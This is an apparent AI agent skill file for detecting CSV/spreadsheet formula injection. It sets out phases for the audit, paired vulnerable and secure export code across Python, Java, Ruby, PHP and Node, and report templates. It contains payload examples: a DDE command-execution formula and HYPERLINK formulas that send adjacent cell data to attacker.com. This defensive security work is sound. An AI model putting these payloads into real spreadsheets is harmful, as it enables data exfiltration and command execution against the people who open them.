---
name: sast-csvinj
description: >-
  Detect CSV / spreadsheet formula injection vulnerabilities where user-controlled
  cell values starting with =, +, -, or @ are written to a CSV or spreadsheet
  export (XLSX, ODS) without leading-character sanitisation, enabling arbitrary
  formula execution when the file is opened in Excel, LibreOffice, or Google
  Sheets. Uses a three-phase approach: recon (find CSV/spreadsheet write sinks),
  batched verify (trace user input to those sinks in parallel subagents, 3 sites
  each), and merge (consolidate batch results). Covers Python csv / pandas /
  openpyxl, Java OpenCSV / Apache POI, Ruby CSV / caxlsx, PHP fputcsv /
  PhpSpreadsheet, and Node csv-stringify / exceljs / papaparse. Requires
  sast/architecture.md (run sast-analysis first). Outputs findings to
  sast/csvinj-results.md and sast/csvinj-results.json.
version: 0.1.0
---

# CSV / Formula Injection Detection

You are performing a focused security assessment to find CSV and spreadsheet formula injection vulnerabilities in a codebase. This skill uses a three-phase approach with subagents: **recon** (find CSV/spreadsheet write sinks that include any dynamic variable), **batched verify** (taint analysis in parallel batches of 3), and **merge** (consolidate batch reports into one file).

**Prerequisites**: `sast/architecture.md` must exist. Run the analysis skill first if it doesn't.

---

## What is CSV / Formula Injection

CSV injection (also called formula injection or Excel macro injection) occurs when user-supplied data is written into a CSV or spreadsheet export as a raw cell value, and that value begins with a character that spreadsheet applications interpret as a formula prefix: `=`, `+`, `-`, or `@`. When a victim downloads the file and opens it in Microsoft Excel, LibreOffice Calc, or Google Sheets, the application evaluates the cell as a formula rather than displaying it as text.

Classic payloads exploit Dynamic Data Exchange (DDE) to execute OS commands (`=DDE("cmd","/c calc.exe","")` on Windows), exfiltrate other cell data via `=HYPERLINK("https://attacker.com/?"&A1&B1,"Click here")`, or silently corrupt computed columns with arithmetic like `=-1+2`. Modern spreadsheet applications show security warnings for DDE and external network calls, but user acceptance rates remain high — especially in enterprise environments where macros are trusted by policy.

The core pattern: *unvalidated user-supplied text reaching a CSV write call or spreadsheet cell-value setter without a leading-character escape or numeric type coercion.*

### What CSV Injection IS

- Writing a raw request field directly as a CSV cell: `writer.writerow([user_name, user_comment])` where `user_comment` is `=HYPERLINK(...)`
- Setting a spreadsheet cell value from user input: `ws.cell(row=i, column=3).value = row["description"]`
- Using pandas `to_csv` / `to_excel` on a DataFrame that contains columns populated from user input
- Concatenating user input into a CSV string with Python's `csv.writer`, Node's `csv-stringify`, or PHP's `fputcsv` without stripping or escaping the leading character
- Second-order injection: the value was stored in the database from user input, then later read and written to a CSV export without re-sanitisation

### What CSV Injection is NOT

Do not flag these as CSV injection:

- **Safe numeric coercion**: `writer.writerow([name, str(int(amount))])` — casting to `int` or `float` before write guarantees the cell cannot start with `=+−@`
- **Explicit prefix escaping**: `"'" + cell_value` (prepend a single quote) or a helper that replaces leading formula chars — this is the canonical fix and is safe
- **Server-side-only CSV**: a CSV consumed exclusively by a machine parser (e.g., an ETL pipeline) that is never opened in a spreadsheet application. Evaluate this claim carefully — many "API-only" exports end up forwarded to analysts who open them in Excel
- **Static / server-controlled data**: all cell values come from hardcoded constants, configuration, or server-side queries with no user-supplied columns
- **Already-numeric database columns**: a column whose type is `INTEGER`, `DECIMAL`, `FLOAT`, or `DATE` at the database layer cannot carry a formula prefix — do not flag

### Patterns That Prevent CSV Injection

**1. Leading-character prefix escape (most common fix)**
```python
# Python — prefix any cell value that starts with a formula char
def sanitise_csv_cell(value: str) -> str:
    if value and value[0] in ('=', '+', '-', '@', '\t', '\r'):
        return "'" + value
    return value

writer.writerow([sanitise_csv_cell(user_name), sanitise_csv_cell(user_comment)])
```

```javascript
// Node.js — same idea
function sanitiseCsvCell(value) {
  if (typeof value === 'string' && /^[=+\-@\t\r]/.test(value)) {
    return `'${value}`;
  }
  return value;
}
```

```java
// Java — utility before passing to OpenCSV
public static String sanitiseCsvCell(String value) {
    if (value != null && !value.isEmpty() && "=+-@\t\r".indexOf(value.charAt(0)) >= 0) {
        return "'" + value;
    }
    return value;
}
```

**2. Numeric type coercion (when semantics allow)**
```python
# Only valid when the field is always numeric
writer.writerow([user_id, str(int(amount)), str(float(score))])
```

**3. Allowlist / reject leading characters (strict validation)**
```python
import re

def validate_text_field(value: str) -> str:
    if re.match(r'^[=+\-@]', value):
        raise ValueError("Field value may not start with a formula character")
    return value
```

**4. Content-Disposition does NOT prevent exploitation**

Setting `Content-Disposition: attachment` only controls whether the browser auto-opens the file; it does not prevent the user from opening the downloaded file in Excel. Do not treat `Content-Disposition: attachment` alone as a mitigation.

---

## Vulnerable vs. Secure Examples

### Python — csv.writer

```python
# VULNERABLE: raw user input written directly as cell value
import csv
from flask import request, make_response

@app.route('/export/users')
def export_users():
    users = User.query.all()
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(['Name', 'Email', 'Bio'])
    for user in users:
        writer.writerow([user.name, user.email, user.bio])  # bio is user-controlled
    response = make_response(output.getvalue())
    response.headers['Content-Type'] = 'text/csv'
    response.headers['Content-Disposition'] = 'attachment; filename=users.csv'
    return response

# SECURE: sanitise each cell before writing
def sanitise(v: str) -> str:
    v = str(v)
    return ("'" + v) if v and v[0] in ('=', '+', '-', '@', '\t', '\r') else v

@app.route('/export/users')
def export_users():
    users = User.query.all()
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(['Name', 'Email', 'Bio'])
    for user in users:
        writer.writerow([sanitise(user.name), sanitise(user.email), sanitise(user.bio)])
    response = make_response(output.getvalue())
    response.headers['Content-Type'] = 'text/csv'
    response.headers['Content-Disposition'] = 'attachment; filename=users.csv'
    return response
```

### Python — pandas to_csv / to_excel

```python
# VULNERABLE: DataFrame built from user-supplied rows then exported
import pandas as pd

@app.route('/export/orders')
def export_orders():
    orders = Order.query.all()
    data = [{'id': o.id, 'customer': o.customer_name, 'note': o.note} for o in orders]
    df = pd.DataFrame(data)
    output = io.BytesIO()
    df.to_excel(output, index=False)  # 'note' column may contain =HYPERLINK(...)
    output.seek(0)
    return send_file(output, download_name='orders.xlsx', as_attachment=True)

# SECURE: sanitise string columns before export
def sanitise_df(df: pd.DataFrame) -> pd.DataFrame:
    for col in df.select_dtypes(include='object').columns:
        df[col] = df[col].apply(
            lambda v: ("'" + str(v)) if isinstance(v, str) and v and v[0] in ('=', '+', '-', '@') else v
        )
    return df

@app.route('/export/orders')
def export_orders():
    orders = Order.query.all()
    data = [{'id': o.id, 'customer': o.customer_name, 'note': o.note} for o in orders]
    df = sanitise_df(pd.DataFrame(data))
    output = io.BytesIO()
    df.to_excel(output, index=False)
    output.seek(0)
    return send_file(output, download_name='orders.xlsx', as_attachment=True)
```

### Python — openpyxl

```python
# VULNERABLE: cell value set from user-controlled attribute
from openpyxl import Workbook

def generate_report(submissions):
    wb = Workbook()
    ws = wb.active
    ws.append(['Title', 'Submitter', 'Content'])
    for s in submissions:
        ws.append([s.title, s.submitter, s.content])  # content is user-controlled
    wb.save('report.xlsx')

# SECURE: sanitise before appending
def sanitise(v):
    s = str(v)
    return ("'" + s) if s and s[0] in ('=', '+', '-', '@') else s

def generate_report(submissions):
    wb = Workbook()
    ws = wb.active
    ws.append(['Title', 'Submitter', 'Content'])
    for s in submissions:
        ws.append([sanitise(s.title), sanitise(s.submitter), sanitise(s.content)])
    wb.save('report.xlsx')
```

### Node.js — csv-stringify

```javascript
// VULNERABLE: user-supplied fields passed directly to stringify
const stringify = require('csv-stringify');

app.get('/export/feedback', async (req, res) => {
  const rows = await db.query('SELECT name, email, message FROM feedback');
  stringify(rows, { header: true }, (err, output) => {  // 'message' may contain =DDE(...)
    res.set('Content-Type', 'text/csv');
    res.set('Content-Disposition', 'attachment; filename=feedback.csv');
    res.send(output);
  });
});

// SECURE: map rows through sanitiser before stringifying
function sanitiseCsvCell(v) {
  const s = String(v ?? '');
  return /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;
}

app.get('/export/feedback', async (req, res) => {
  const rows = await db.query('SELECT name, email, message FROM feedback');
  const safe = rows.map(r => ({
    name: sanitiseCsvCell(r.name),
    email: sanitiseCsvCell(r.email),
    message: sanitiseCsvCell(r.message),
  }));
  stringify(safe, { header: true }, (err, output) => {
    res.set('Content-Type', 'text/csv');
    res.set('Content-Disposition', 'attachment; filename=feedback.csv');
    res.send(output);
  });
});
```

### Node.js — exceljs

```javascript
// VULNERABLE: user-supplied data added as row values
const ExcelJS = require('exceljs');

async function exportComments(comments) {
  const wb = new ExcelJS.Workbook();
  const ws = wb.addWorksheet('Comments');
  ws.addRow(['Author', 'Text', 'Created']);
  for (const c of comments) {
    ws.addRow([c.author, c.text, c.created_at]);  // c.text is user-controlled
  }
  return wb.xlsx.writeBuffer();
}

// SECURE
function sanitise(v) {
  const s = String(v ?? '');
  return /^[=+\-@]/.test(s) ? `'${s}` : s;
}

async function exportComments(comments) {
  const wb = new ExcelJS.Workbook();
  const ws = wb.addWorksheet('Comments');
  ws.addRow(['Author', 'Text', 'Created']);
  for (const c of comments) {
    ws.addRow([sanitise(c.author), sanitise(c.text), c.created_at]);
  }
  return wb.xlsx.writeBuffer();
}
```

### Java — OpenCSV

```java
// VULNERABLE: field from user entity written directly
CSVWriter writer = new CSVWriter(new FileWriter("export.csv"));
for (Ticket ticket : tickets) {
    writer.writeNext(new String[]{
        ticket.getId().toString(),
        ticket.getReporterName(),
        ticket.getDescription()   // user-supplied, may start with =
    });
}

// SECURE
private static String sanitiseCsvCell(String value) {
    if (value != null && !value.isEmpty() && "=+-@\t\r".indexOf(value.charAt(0)) >= 0) {
        return "'" + value;
    }
    return value;
}

for (Ticket ticket : tickets) {
    writer.writeNext(new String[]{
        ticket.getId().toString(),
        sanitiseCsvCell(ticket.getReporterName()),
        sanitiseCsvCell(ticket.getDescription())
    });
}
```

### Java — Apache POI

```java
// VULNERABLE: cell value set from user-supplied attribute
for (int i = 0; i < employees.size(); i++) {
    Row row = sheet.createRow(i + 1);
    row.createCell(0).setCellValue(employees.get(i).getFullName());  // user-controlled
    row.createCell(1).setCellValue(employees.get(i).getDepartment());
    row.createCell(2).setCellValue(employees.get(i).getNotes());      // user-controlled
}

// SECURE
private static String sanitise(String v) {
    if (v != null && !v.isEmpty() && "=+-@".indexOf(v.charAt(0)) >= 0) return "'" + v;
    return v != null ? v : "";
}

for (int i = 0; i < employees.size(); i++) {
    Row row = sheet.createRow(i + 1);
    row.createCell(0).setCellValue(sanitise(employees.get(i).getFullName()));
    row.createCell(1).setCellValue(sanitise(employees.get(i).getDepartment()));
    row.createCell(2).setCellValue(sanitise(employees.get(i).getNotes()));
}
```

### Ruby — CSV.generate

```ruby
# VULNERABLE: user-controlled attribute written as CSV cell
def export_contacts(contacts)
  CSV.generate(headers: true) do |csv|
    csv << ['Name', 'Phone', 'Notes']
    contacts.each { |c| csv << [c.name, c.phone, c.notes] }  # notes is user-input
  end
end

# SECURE
def sanitise_cell(v)
  s = v.to_s
  %w[= + - @].include?(s[0]) ? "'#{s}" : s
end

def export_contacts(contacts)
  CSV.generate(headers: true) do |csv|
    csv << ['Name', 'Phone', 'Notes']
    contacts.each do |c|
      csv << [sanitise_cell(c.name), sanitise_cell(c.phone), sanitise_cell(c.notes)]
    end
  end
end
```

### PHP — fputcsv

```php
// VULNERABLE: user-supplied column written directly
function exportOrders(array $orders): void {
    $fp = fopen('orders.csv', 'w');
    fputcsv($fp, ['ID', 'Customer', 'Comment']);
    foreach ($orders as $order) {
        fputcsv($fp, [$order['id'], $order['customer'], $order['comment']]); // comment = user input
    }
    fclose($fp);
}

// SECURE
function sanitiseCsvCell(string $v): string {
    return (strlen($v) > 0 && in_array($v[0], ['=', '+', '-', '@'], true))
        ? "'" . $v
        : $v;
}

foreach ($orders as $order) {
    fputcsv($fp, [
        $order['id'],
        sanitiseCsvCell($order['customer']),
        sanitiseCsvCell($order['comment']),
    ]);
}
```

---

## Execution

This skill runs in three phases using subagents. Pass the contents of `sast/architecture.md` to all subagents as context.

### Phase 1: Recon — Find CSV / Spreadsheet Write Sinks

Launch a subagent with the following instructions:

> **Goal**: Find every location in the codebase where data is written to a CSV or spreadsheet file using any variable — regardless of whether that variable is user-controlled. Write results to `sast/csvinj-recon.md`.
>
> **Context**: You will be given the project's architecture summary. Use it to understand the tech stack, export patterns, and which CSV/spreadsheet libraries are in use.
>
> **What to search for — CSV and spreadsheet write sinks**:
>
> Flag ANY call that writes cell values from a variable. You are not yet tracing whether the variable is user-controlled; that is Phase 2's job.
>
> **Python**:
> 1. `csv.writer` / `csv.DictWriter` write calls:
>    - `writer.writerow([...])` or `writer.writerows([...])`
>    - `DictWriter.writerow({...})` or `DictWriter.writerows([...])`
>    - Any variable passed as an element of these lists/dicts
> 2. `openpyxl`:
>    - `worksheet.append([...])` or `ws.cell(row=N, column=M).value = var`
> 3. `xlwt`:
>    - `worksheet.write(row, col, var)`
> 4. `pandas`:
>    - `df.to_csv(...)` where `df` is constructed from variables
>    - `df.to_excel(...)` where `df` is constructed from variables
>    - Flag the DataFrame construction sites (e.g., `pd.DataFrame(data)`) when `data` originates from database rows or request parameters
>
> **Java**:
> 5. `opencsv.CSVWriter`:
>    - `csvWriter.writeNext(new String[]{...})` with non-literal array elements
> 6. `Apache POI`:
>    - `cell.setCellValue(var)` where `var` is not a numeric literal or date
>
> **Ruby**:
> 7. `CSV.generate` / `CSV.open` blocks with `csv << [...]` or `csv.add_row([...])`
> 8. `caxlsx` (`Axlsx`): `sheet.add_row([...])` with variable elements
>
> **PHP**:
> 9. `fputcsv($fp, [...])` with non-literal array elements
> 10. `PhpSpreadsheet` (`\PhpOffice\PhpSpreadsheet`): `$cell->setValue($var)` or `$sheet->setCellValue('A1', $var)`
>
> **Node.js**:
> 11. `csv-stringify`: `stringify(rows, ...)` where `rows` is an array of objects with variable fields
> 12. `exceljs`: `worksheet.addRow([...])` with variable elements
> 13. `papaparse`: `Papa.unparse(rows)` where `rows` contains variable fields
>
> **What to skip** (these are safe and do not need to be flagged):
> - Calls where **all** values are hardcoded string literals or numeric literals
> - Calls where every variable is immediately preceded by an explicit numeric cast: `int(v)`, `float(v)`, `Number(v)`, `Integer.parseInt(v)` — coercion eliminates formula-prefix risk for numeric-only data
> - Calls where the value is passed through a function whose name strongly implies sanitisation: `sanitise_csv(v)`, `escape_formula(v)`, `prefix_formula_char(v)`, `safe_cell(v)` — note these for Phase 2 verification
>
> **Output format** — write to `sast/csvinj-recon.md`:
>
> ```markdown
> # CSV Injection Recon: [Project Name]
>
> ## Summary
> Found [N] locations where data is written to CSV or spreadsheet files using dynamic variables.
>
> ## Write Sinks
>
> ### 1. [Descriptive name — e.g., "csv.writer.writerow in export_users endpoint"]
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Function / endpoint**: [function name or route]
> - **Write method**: [csv.writer.writerow / openpyxl ws.append / pandas df.to_csv / CSVWriter.writeNext / fputcsv / etc.]
> - **Variable field(s)**: `var_name` — [brief note: "looks like user bio", "order comment", "unknown origin"]
> - **Code snippet**:
>   ```
>   [the write call and immediately surrounding context]
>   ```
>
> [Repeat for each sink]
> ```

### After Phase 1: Check for Candidates Before Proceeding

After Phase 1 completes, read `sast/csvinj-recon.md`. If the recon found **zero write sinks** (the summary reports "Found 0" or the "Write Sinks" section is empty or absent), **skip Phase 2 entirely**. Instead, write the following content to `sast/csvinj-results.md` and `sast/csvinj-results.json` and stop:

```markdown
# CSV Injection Analysis Results

No vulnerabilities found.
```

```json
{
  "findings": []
}
```

Only proceed to Phase 2 if Phase 1 found at least one write sink.

### Phase 2: Verify — Taint Analysis (Batched)

After Phase 1 completes, read `sast/csvinj-recon.md` and split the write sinks into **batches of up to 3 sinks each**. Launch **one subagent per batch in parallel**. Each subagent traces user input only for its assigned sinks and writes results to its own batch file.

**Batching procedure** (you, the orchestrator, do this — not a subagent):

1. Read `sast/csvinj-recon.md` and count the numbered sink sections under "Write Sinks" (### 1., ### 2., etc.).
2. Divide them into batches of up to 3. For example, 7 sinks → 3 batches (1-3, 4-6, 7).
3. For each batch, extract the full text of those sink sections from the recon file.
4. Launch all batch subagents **in parallel**, passing each one only its assigned sinks.
5. Each subagent writes to `sast/csvinj-batch-N.md` where N is the 1-based batch number.
6. Identify the project's primary language/framework from `sast/architecture.md` and select **only the matching examples** from the "Vulnerable vs. Secure Examples" section above. Include these selected examples in each subagent's instructions where indicated by `[TECH-STACK EXAMPLES]` below.

Give each batch subagent the following instructions (substitute the batch-specific values):

> **Goal**: For each assigned CSV/spreadsheet write sink, determine whether a user-supplied value reaches the written cell or row. Our goal is to find formula injection vulnerabilities. Write results to `sast/csvinj-batch-[N].md`.
>
> **Your assigned write sinks** (from the recon phase):
>
> [Paste the full text of the assigned sink sections here, preserving the original numbering]
>
> **Context**: You will be given the project's architecture summary. Use it to understand request entry points, middleware, data models, and how data flows from the HTTP layer to the export layer.
>
> **CSV injection reference — trace the written variable(s) backwards to their origin**:
>
> 1. **Direct user input** — the variable is assigned directly from a request source with no transformation:
>    - HTTP query params: `request.GET.get(...)`, `req.query.x`, `params[:x]`, `$_GET['x']`
>    - Path parameters: `request.path_params['id']`, `req.params.id`, `params[:id]`
>    - Request body / form fields: `request.POST.get(...)`, `req.body.x`, `request.form['x']`
>    - HTTP headers: `request.headers.get(...)`, `req.headers['x']`
>
> 2. **Indirect user input** — the variable is derived from user input through intermediate assignments, model attributes, service calls, or helper functions:
>    - Model attribute populated from a form field or API body (`user.bio`, `order.comment`, `ticket.description`)
>    - Variable returned from a service / repository method that fetches data originally submitted by a user
>    - Variable passed as a function argument — trace the call site(s)
>    - Variable conditionally assigned — check all branches
>
> 3. **Database-resident user input (second-order)** — the variable is read from the database, but the stored value originally came from user input:
>    - Find where this value was written to the DB — was it stored from a user-supplied field?
>    - Was it sanitised at write time? If not, it is tainted in the CSV export path too.
>
> 4. **Server-side / hardcoded value** — the variable is a computed aggregate (e.g., `SUM(quantity * price)` performed in SQL), an enum value, a server-generated ID, a timestamp from `datetime.now()`, or a hardcoded constant — this sink is NOT exploitable for CSV injection.
>
> **Mitigations — check even if user input reaches the variable**:
>
> - **Leading-character prefix escape**: a helper prepends `'` (single quote) to any value starting with `= + - @ \t \r`. This is the canonical fix — classify as Not Vulnerable only if every user-controlled column goes through such a helper before the write call.
> - **Numeric type coercion**: `int(v)`, `float(v)`, `Number(v)`, `Integer.parseInt(v)` — effective only if the field is semantically numeric; if the field could legitimately contain text, do not accept this as a mitigation.
> - **Allowlist / reject**: the code explicitly rejects values whose first character is `= + - @` before writing — classify as Not Vulnerable only if this check gates all user-controlled columns.
> - **Content-Disposition alone** is NOT a mitigation — it does not prevent a user from opening the file in Excel.
> - **Server-side CSV consumption only**: if the export is provably consumed only by a machine (ETL, parser) and never opened by a human in a spreadsheet app, exploitability is `unreachable`. Be conservative — many "internal" exports get shared with end-users.
>
> **Severity and exploitability rules**:
>
> - Default severity: **medium** (requires victim to open the file and accept formula execution prompt)
> - Raise to **high** when: the export is a financial, HR, payroll, compliance, or audit report that is highly likely to be opened in Excel by a business user; OR the application explicitly advertises "Excel export"; OR the data includes sensitive fields (salary, SSN, credit card) alongside formulas that could exfiltrate them
> - `exploitability: reachable` — user input flows directly or via a model attribute to the write call with no sanitisation
> - `exploitability: conditional` — user input flows through a service boundary or complex indirect path, or partial sanitisation covers some columns but not all
> - `exploitability: unreachable` — provably server-side-only data, or all user-controlled columns are covered by numeric coercion or prefix escaping
> - `confidence: high` — the field name clearly matches a user-controlled entity attribute (e.g., `user.bio`, `comment.body`, `ticket.description`) and no sanitiser is present
> - `confidence: medium` — the flow crosses a service boundary (e.g., fetched via RPC, from an external API) or the sanitiser coverage is ambiguous
> - `confidence: low` — the origin cannot be determined with confidence from static analysis alone
>
> **Chaining**:
> - When the same export endpoint also writes PII fields (name, email, SSN, address), set `chain_id: "data-export-risk"` — this links the CSV injection finding to any `sast-pii` finding for the same export. The combined attack lets an attacker craft a formula that reads adjacent PII cells and exfiltrates them to an attacker-controlled URL.
>
> **Vulnerable vs. Secure examples for this project's tech stack**:
>
> [TECH-STACK EXAMPLES]
>
> **Classification**:
> - **Vulnerable**: User input demonstrably reaches the write call for at least one column, with no effective leading-character sanitisation or numeric coercion covering that column.
> - **Likely Vulnerable**: User input probably reaches the write call (indirect flow, service boundary, second-order DB read), or partial sanitisation leaves some user-controlled columns uncovered.
> - **Not Vulnerable**: All written values are server-side constants, or every user-controlled column is guarded by leading-character escaping or forced numeric coercion.
> - **Needs Manual Review**: Cannot determine the variable's origin with confidence (opaque helpers, cross-service flows, generated ORM models).
>
> **Output format** — write to `sast/csvinj-batch-[N].md`:
>
> ```markdown
> # CSV Injection Batch [N] Results
>
> ## Findings
>
> ### [VULNERABLE] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [route or function name]
> - **Issue**: [e.g., "HTTP form field `bio` flows directly into csv.writer.writerow without sanitisation"]
> - **Taint trace**: [Step-by-step from entry point to the write call]
> - **Affected column(s)**: [which columns in the row are user-controlled]
> - **Severity**: medium | high
> - **Exploitability**: reachable | conditional
> - **Confidence**: high | medium | low
> - **chain_id**: data-export-risk | null
> - **Impact**: [What an attacker can do — exfiltrate adjacent cells, execute DDE commands, etc.]
> - **Remediation**: [Sanitise cell values with leading-character prefix escape before write; or enforce numeric coercion for numeric-only columns]
> - **Proof-of-concept payload**: `=HYPERLINK("https://attacker.com/?"&A2&B2,"Click here")`
>
> ### [LIKELY VULNERABLE] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [route or function name]
> - **Issue**: [e.g., "Second-order: user note stored in DB, exported without sanitisation"]
> - **Taint trace**: [Best-effort trace; mark uncertain steps]
> - **Affected column(s)**: [columns at risk]
> - **Severity**: medium | high
> - **Exploitability**: conditional
> - **Confidence**: medium | low
> - **chain_id**: data-export-risk | null
> - **Concern**: [Why it remains a risk despite indirect flow]
> - **Remediation**: [Apply leading-character escaping to all string columns from user-sourced tables]
>
> ### [NOT VULNERABLE] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [route or function name]
> - **Reason**: [e.g., "All columns are server-computed aggregates (SUM, COUNT)" or "bio column passes through sanitise_csv() before write"]
>
> ### [NEEDS MANUAL REVIEW] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [route or function name]
> - **Uncertainty**: [Why origin could not be determined]
> - **Suggestion**: [What to trace manually — e.g., "Trace ExportService.buildRows() to find where user columns are populated"]
> ```

### Phase 3: Merge — Consolidate Batch Results

After **all** Phase 2 batch subagents complete, read every `sast/csvinj-batch-*.md` file and merge them into `sast/csvinj-results.md` (human-readable) and `sast/csvinj-results.json` (canonical machine-readable). You (the orchestrator) do this directly — no subagent needed.

**Merge procedure**:

1. Read all `sast/csvinj-batch-1.md`, `sast/csvinj-batch-2.md`, ... files.
2. Collect all findings from each batch file and combine them into one list, preserving all detail fields.
3. Count totals across all batches for the executive summary.
4. Write the merged human report to `sast/csvinj-results.md`:

```markdown
# CSV Injection Analysis Results: [Project Name]

## Executive Summary
- Write sinks analyzed: [total across all batches]
- Vulnerable: [N]
- Likely Vulnerable: [N]
- Not Vulnerable: [N]
- Needs Manual Review: [N]

## Findings

[All findings from all batches, grouped by classification:
 VULNERABLE first, then LIKELY VULNERABLE, then NEEDS MANUAL REVIEW, then NOT VULNERABLE.
 Preserve every field from the batch results exactly as written.]
```

5. Write `sast/csvinj-results.json` using the canonical finding schema. One entry per Vulnerable or Likely Vulnerable finding; omit Not Vulnerable and Needs Manual Review from the JSON (they appear only in the markdown). Use sequential ids starting from `csvinj-1`:

```json
{
  "findings": [
    {
      "id": "csvinj-1",
      "skill": "sast-csvinj",
      "severity": "medium",
      "title": "CSV formula injection via user-controlled bio field in /export/users",
      "description": "The user's bio attribute is written directly as a CSV cell value in the /export/users endpoint without leading-character sanitisation. An attacker who sets their bio to '=HYPERLINK(\"https://attacker.com/\"&B2,\"Click\")' will cause the formula to execute when any admin downloads and opens the CSV in Excel or LibreOffice Calc, potentially exfiltrating adjacent cell data.",
      "location": { "file": "app/views/exports.py", "line": 42, "column": 8 },
      "remediation": "Before writing any string column that originates from user input, prepend a single quote if the value starts with =, +, -, @, \\t, or \\r. Alternatively, enforce numeric coercion for columns that should always be numeric.",
      "exploitability": "reachable",
      "confidence": "high",
      "chain_id": "data-export-risk"
    }
  ]
}
```

If no Vulnerable or Likely Vulnerable findings were produced across all batches, write `"findings": []`.

6. **After writing both output files**, delete all intermediate files:
   - `sast/csvinj-recon.md`
   - `sast/csvinj-batch-1.md`, `sast/csvinj-batch-2.md`, ... (all batch files)

---

## chain_id Values

| chain_id | Meaning |
|---|---|
| `data-export-risk` | The same CSV/spreadsheet export writes both formula-injectable user text AND PII (name, email, SSN, address, salary). The combined attack allows a malicious formula in one cell to read adjacent PII cells and exfiltrate them via `HYPERLINK` or `WEBSERVICE`. Link this finding to any `sast-pii` finding for the same endpoint. |

---

## Important Reminders

- Read `sast/architecture.md` and pass its content to all subagents as context.
- Phase 2 must run AFTER Phase 1 completes — it depends on the recon output.
- Phase 3 must run AFTER all Phase 2 batches complete — it depends on all batch outputs.
- Batch size is **3 write sinks per subagent**. If there are 1-3 sinks total, use a single subagent. If there are 7, use 3 subagents (3+3+1).
- Launch all batch subagents **in parallel** — do not run them sequentially.
- Each batch subagent receives only its assigned sinks' text from the recon file, not the entire recon file. This keeps each subagent's context small and focused.
- **Phase 1 is purely structural**: flag any write call with a dynamic variable, regardless of whether that variable is user-controlled. Do not trace user input in Phase 1 — that is Phase 2's job.
- **Phase 2 is purely taint analysis**: for each assigned sink, trace the written variable back to its origin. If it comes from user-controlled input and no leading-character sanitisation covers it, the sink is a real vulnerability.
- `Content-Disposition: attachment` is **not** a mitigation — it does not prevent the user from opening the downloaded file in Excel. Never classify a sink as safe solely because the response includes this header.
- Numeric coercion (`int(v)`, `float(v)`) **is** a valid mitigation only when the field is semantically always numeric. If the field could ever hold text (free-form comments, descriptions, names), coercion is not guaranteed and should not be accepted as a complete fix.
- Second-order injection is easy to miss: a user submits a bio via a profile update form; the bio is stored in the database; six months later an admin exports a user report; the bio column is written unsanitised. Treat any string column whose value was originally entered by a user as tainted even if it travels through a database round-trip.
- The `chain_id: "data-export-risk"` link is particularly important for financial, HR, and compliance exports. When you see these domains, actively look for adjacent PII columns and set the chain_id accordingly.
- When in doubt, classify as "Needs Manual Review" rather than "Not Vulnerable". False negatives in export paths are especially harmful because they affect every user who downloads the file.
- Clean up intermediate files: delete `sast/csvinj-recon.md` and all `sast/csvinj-batch-*.md` files after both `sast/csvinj-results.md` and `sast/csvinj-results.json` are written.
